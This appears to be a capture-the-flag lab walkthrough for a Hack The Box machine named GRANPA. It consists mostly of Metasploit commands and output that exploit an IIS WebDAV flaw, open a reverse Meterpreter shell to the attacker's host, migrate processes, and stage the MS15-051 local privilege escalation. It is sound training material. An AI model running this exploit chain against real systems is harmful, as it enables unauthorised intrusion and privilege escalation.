### Metasploit Training
```shell
msf > use exploit/windows/iis/iis_webdav_scstoragepathfromurl 
```
**Confirm target**
```shell
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 The target is vulnerable.
```
```shell
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
--------
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```
**Mirgrate "More powerful process"**
```shell
meterpreter > ps
--------
1800  604   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
--------

meterpreter > migrate 1800
[*] Migrating from 2776 to 1800...
[*] Migration completed successfully.
```
**Select exploit**
```shell
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use exploit/windows/local/ms15_051_client_copy_image 
msf exploit(windows/local/ms15_051_client_copy_image) > sessions -l
Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANPA  10.10.14.11:4444 -> 10.10.10.14:1030 (10.10.10.14)

msf exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.11
LHOST => 10.10.14.11

msf exploit(windows/local/ms15_051_client_copy_image) > run
```
